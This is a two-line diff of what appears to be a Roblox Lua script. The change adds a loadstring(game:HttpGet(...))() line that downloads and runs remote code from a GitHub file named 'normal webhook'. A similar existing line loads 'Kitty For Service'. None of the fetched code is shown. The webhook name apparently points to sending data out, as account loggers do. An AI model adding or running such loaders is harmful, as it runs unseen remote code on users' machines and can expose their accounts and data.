@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Idk/refs/heads/main/Kitty%20For%20Service"))()
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Webhook/refs/heads/main/normal%20webhook"))()
